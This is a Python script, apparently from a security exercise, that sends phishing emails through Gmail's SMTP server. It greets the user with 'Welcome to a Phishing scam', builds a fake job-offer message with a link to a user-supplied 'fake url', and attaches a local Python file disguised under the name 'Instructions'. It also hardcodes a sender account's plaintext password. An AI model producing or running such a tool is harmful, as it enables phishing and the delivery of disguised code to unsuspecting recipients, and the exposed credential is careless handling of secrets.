#!/usr/bin/python


# Python code to illustrate Sending mail from
# your Gmail account
import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from bs4 import BeautifulSoup
from requests import get
import re
import urllib.request as urllib2
import urllib.request
import ssl
import html2text
import requests
from os import popen
import os.path


def from_URL_to_email(url):  # assume this is html

    body = ""
    session = requests.session()
    response = session.get(url).text
    body = html2text.html2text(response)
    return body


def send_mail():
    basic_string = ""
    sender_email = "cyber.attacker.test@gmail.com"
    print("Welcome to a Phishing scam ")
    if(len(sys.argv) < 4):
        print("Error \nPlease enter 4 or 5 inouts")
        sys.exit()
    rec_username = sys.argv[1]
    rec_email = sys.argv[2]
    rec_title = sys.argv[3]
    
    
    reciever_email = rec_username+"@"+rec_email
    password = "~4!4(8N'U(psM#`>"
    email_body = ""

    if(len(sys.argv) == 4):
        rec_url = input(str("Please enter a fake url: "))
        email_body = f"""\
    
    Congratulations! We are currently looking for a {rec_title}.
    Please read the attachment file before submitting your resume. 
    Go to the page: <a href="{rec_url}">Sumbit your resume TODAY</a>
    Thanks,
    Eclipse Team.
    """
    
    if(len(sys.argv) == 5):
        
        fourth_element = sys.argv[4]
        if(sys.argv[4].startswith("http")):

            email_body = from_URL_to_email(fourth_element)

        elif os.path.exists(fourth_element):  # its a path
            with open(fourth_element, "r") as f:
                lines = f.readlines()
                name = ""
                title=""
                
                
                for i in range(len(lines)):
                    if(email_body!=""):
                        email_body+="\n"+lines[i] 
                    if("name" in lines[i]):
                        name=lines[i].split(":")[1].strip()  
                                       
                    if("title" in lines[i] or "Title" in lines[i]):
                        title=lines[i].split(":")[1].strip()
                       
                    if("body"in lines[i] or "content" in lines[i]):
                        email_body=lines[i].split(":")[1].strip()
                       

                if not name :
                    print ("no name")
                    sys.exit()
                if not title :
                    print ("no title")
                    sys.exit()

                rec_title=title 
                reciever_email =name

                   
        elif "title" in fourth_element or "Title" in fourth_element:
            
            lines=fourth_element.split(":")
            name = ""
            title = ""
            for i in range(len(lines)):
                if(lines[i] == "name"):
                    name=  lines[i+1]
                    
                   
                    
                if(lines[i] == "title" or lines[i] == "Title"):
                    title=lines[i+1]
                if(lines[i] == "body"or i == "content"):
                    email_body=lines[i+1]
            if not name :
                print ("no name")
                sys.exit()
            if not title :
                print ("no title")
                sys.exit()
            
            
            rec_title=title 
            reciever_email =name
            
            
            
            
   
    msg2 = MIMEMultipart()
    msg2['From'] = sender_email
    msg2['To'] = reciever_email
    msg2['Subject'] = rec_title
    if(len(sys.argv)==4):
        part = MIMEText(email_body, 'html')
    else:
        part = MIMEText(email_body, 'plain')
    msg2.attach(part)
    filename = "Instructions"
    attachment = open("attachment.py", "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg2.attach(p)

    #message = MIMEText(email_body ,'html')

    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # start TLS for security
    s.starttls()

    # Authentication
    s.login(sender_email, password)

    # message to be sent

    # sending the mail
    
    s.sendmail(sender_email, reciever_email, msg2.as_string())
    print("Scam succesfully")
    # terminating the session
    s.quit()


def main():
    send_mail()


if __name__ == "__main__":
    main()
